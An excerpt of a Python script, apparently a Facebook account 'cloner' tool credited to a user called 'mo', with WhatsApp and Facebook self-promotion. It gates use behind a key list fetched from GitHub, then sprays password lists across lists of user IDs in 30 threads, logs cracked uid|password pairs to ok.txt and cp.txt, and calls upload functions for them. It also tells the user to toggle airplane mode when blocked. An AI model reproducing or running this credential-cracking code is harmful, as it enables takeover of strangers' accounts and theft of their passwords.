...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ WATSAPPP🤲https:wa.me/±93707266012")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/mo707/afghan22/main/afghan22.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;33m│ [✓] AUTHOR  
    mo \033[1;32m[mo]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37m |mo \x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  93707266012           │
\033[1;36m│ [✓] mo : \x1b[1;32mPRO PRONOY\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [mo] [pÏඋඋħÏ]\x1b[0m    
 """)
		print("%s [%s•%s] %sTOOL NAME : %smo❌ PROO CLONER❌"%(G,R,G,B,G))
		...
		print(GET)
		os.system('xdg-open https://www.facebook.com/Badbakta.mo.jan.707')
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK mo SAHIL 707-> ok.txt"%(G))
				print("%s [+] CP mo SAHIL 707-> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
	...
	def old4_7(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK mo SAHIL 707-> ok.txt"%(G))
				print("%s [+] CP mo SAHIL 707-> cp.txt"%(R))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK mo SAHIL-> ok.txt"%(G))
				print("%s [+] CP mo SAHIL-> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [mo] : %s/%s -> \033[0;92m [ mo-OK:%s ]- \033[0;91m[mo-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[mo-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [mo-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[mo-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [mo-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
